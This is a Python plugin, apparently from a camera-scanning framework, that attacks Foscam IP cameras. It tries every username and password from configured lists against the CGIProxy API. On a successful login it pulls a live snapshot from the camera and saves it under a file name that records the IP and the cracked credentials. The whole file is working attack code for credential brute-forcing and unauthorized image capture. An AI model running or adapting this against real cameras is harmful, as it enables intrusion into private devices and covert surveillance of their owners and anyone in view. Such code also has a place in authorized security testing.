import requests

from loguru import logger

from .base import POCTemplate


class FoscamWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['foscam']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """Foscam cameras with default credentials via CGIProxy API"""

    def verify(self, ip, port=80):
        """Foscam uses URL-based authentication via CGIProxy"""
        headers = self._get_headers()
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    url = self._get_url(ip, port, f'/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo&usr={user}&pwd={password}')
                    r = requests.get(
                        url,
                        headers=headers,
                        verify=False,
                        timeout=self.config.timeout,
                        proxies=proxies
                    )
                    if r.status_code == 200 and 'result' in r.text:
                        # Foscam returns result=0 on success
                        if '<result>0</result>' in r.text or '"result" : 0' in r.text:
                            return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = self._get_url(ip, port, f'/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={user}&pwd={password}')
        return self._snapshot(url, img_file_name)


POCTemplate.register_poc(FoscamWeakPassword)
